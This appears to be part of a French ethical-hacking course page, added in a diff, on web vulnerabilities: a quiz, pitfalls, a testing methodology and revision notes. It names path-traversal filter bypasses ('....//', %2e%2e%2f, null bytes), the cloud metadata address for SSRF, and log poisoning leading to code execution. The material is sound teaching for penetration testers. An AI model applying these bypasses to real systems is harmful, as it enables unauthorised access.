+        <button class="opt">En modifiant l'adresse MAC de la carte réseau</button>
+      </div>
+      <div class="q__exp">Si le filtre supprime "..//" en une seule passe non récursive, la chaîne "....//" devient "../". De même, l'encodage URL (%2e%2e%2f) contourne les filtres qui vérifient la chaîne brute avant décodage.</div>
+    </div>
+  </div>
+
+<h2>8. Erreurs classiques — récapitulatif</h2>
+
+  <div class="box box--pitfall">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-warning"></use></svg> À reconnaître en examen</div>
+    <ul>
+      <li>Tenter de sécuriser les injections SQL par des listes noires de mots-clés facilement contournables par obfuscation.</li>
+      <li>Oublier l'attribut HttpOnly sur les cookies de session, laissant le jeton d'authentification vulnérable au vol par XSS.</li>
+      <li>Se fier aux contrôles d'accès effectués uniquement côté client en JavaScript sans validation côté serveur.</li>
+      <li>Supposer qu'une injection aveugle (Blind SQLi) est inexploitable parce qu'aucune donnée ne s'affiche dans la page.</li>
+    </ul>
+  </div>
+
+<h2>9. Méthodologie de résolution</h2>
+
+  <div class="box box--method">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-compass"></use></svg> Démarche d’ingénierie pas à pas</div>
+    <ol>
+      <li>Intercepter et cartographier l'arborescence de l'application web avec le proxy Burp Suite.</li>
+      <li>Tester les contrôles d'accès en permutant les identifiants d'objets (IDOR) entre différents comptes.</li>
+      <li>Auditer les points d'entrée pour détecter les injections SQL (in-band, booléennes et basées sur le temps).</li>
+      <li>Rechercher les failles XSS en observant le contexte d'échappement des entrées réfléchies ou stockées.</li>
+      <li>Tester les traversées de répertoire avec des contournements d'encodage URL (%2e%2e%2f) et des null bytes.</li>
+    </ol>
+  </div>
+
+<h2>10. Révision active</h2>
+
+  <div class="box box--revision">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-pin"></use></svg> Résumé essentiel</div>
+    <ul>
+      <li>Broken Access Control est la vulnérabilité web n°1 mondiale selon l'OWASP : elle frappe directement la logique métier.</li>
+      <li>Les requêtes préparées avec paramètres liés constituent l'unique remédiation définitive contre les injections SQL.</li>
+      <li>Les failles XSS permettent le vol de sessions utilisateurs, contré en profondeur par HttpOnly et les politiques CSP.</li>
+      <li>Les attaques SSRF exposent les architectures Cloud en ciblant l'API interne de métadonnées non authentifiée.</li>
+      <li>Les traversées de répertoire (Path Traversal / LFI) peuvent déboucher sur une exécution de code via log poisoning.</li>
+    </ul>
+    <h3>Checklist de maîtrise</h3>
+    <ul class="check">
+      <li>Je maîtrise l'exploitation et la remédiation des injections SQL avec Prepared Statements.</li>
+      <li>Je sais différencier XSS Stored, Reflected et DOM et mettre en œuvre les en-têtes CSP et HttpOnly.</li>
+      <li>Je comprends le mécanisme des attaques SSRF contre les architectures Cloud.</li>
+      <li>Je sais auditer et automatiser la détection des failles web à l'aide de Burp Suite et sqlmap.</li>
+    </ul>
+    <h3>Les 8 notions à connaître absolument</h3>
+    <ol>
+      <li><strong>Broken Access Control (A01) :</strong> Défaillance de contrôle d'accès permettant à un utilisateur d'agir sur des ressources non autorisées (IDOR).</li><li><strong>Injection SQL (SQLi) :</strong> Concaténation non assainie d'entrées utilisateur dans une requête SQL altérant la logique d'exécution de la base.</li><li><strong>Cross-Site Scripting (XSS) :</strong> Injection de scripts malveillants exécutés dans le navigateur des victimes légitimes (Stored, Reflected, DOM).</li><li><strong>Server-Side Request Forgery (SSRF) :</strong> Faille contraignant le serveur web à forger des requêtes HTTP vers des ressources internes (ex: 169.254.169.254).</li><li><strong>Path Traversal (Traversée de Répertoire) :</strong> Manipulation de paramètres de chemin via des séquences ../ pour accéder à des fichiers arbitraires hors racine.</li>
+    </ol>
+    <p><a class="btn" href="cartes.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-cards"></use></svg> Réviser avec les flashcards</a>
+       <a class="btn" href="formules.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-file"></use></svg> Mémo syntaxe</a></p>
+  </div>
+
+<h2>11. Test de maîtrise</h2>
+
+  <div class="box box--tech">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-chart"></use></svg> Comment t'auto-évaluer</div>
+    <p>Le QCM ci-dessus est un test de maîtrise. Lis ton pourcentage :</p>
+    <div class="bands">
+      <div class="bandrow bandrow--low">&lt; 50 % — Reprends les sections théoriques et revois les définitions clés.</div>
+      <div class="bandrow bandrow--mid">50–69 % — Pratique les exercices N1 de l'atelier avant de retenter le test.</div>
+      <div class="bandrow bandrow--good">70–89 % — Bon niveau opérationnel : affine les cas limites et les options d'outils.</div>
+      <div class="bandrow bandrow--top">≥ 95 % — Maîtrise d'ingénierie validée : passe au module suivant.</div>
+    </div>
+    <p style="margin-top:12px"><label class="checkbox"><input type="checkbox" data-mark-done> <span>Je considère ce chapitre maîtrisé (≥ 95 % au test de maîtrise).</span></label></p>
+  </div>
+
+  <div class="chnav">
+    <a class="btn" href="../sommaire.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-arrow-left"></use></svg> Sommaire</a>
+    <a class="btn btn--primary" href="chapitre5.html">Module 5 — Exploitation Système, Escalade de Privilèges & Pivoting (Gaining Access) <svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-arrow-right"></use></svg></a>
+  </div>
+
+  <p class="disclaimer">Objectif de maîtrise 19/20 — ta note réelle dépend aussi de ton travail.
+  Sources : Programme officiel Certified Ethical Hacker (CEH v12), Référentiels PTES (Penetration Testing Execution Standard), OWASP Web Security Testing Guide (WSTG v4.2), NIST SP 800-115, Documentation GTFOBins & MITRE ATT&CK.</p>
+</main>
+
+<script src="../assets/js/cours.js"></script>
+<script src="/assets/js/code-lab.js" defer></script>
+</body>
+</html>
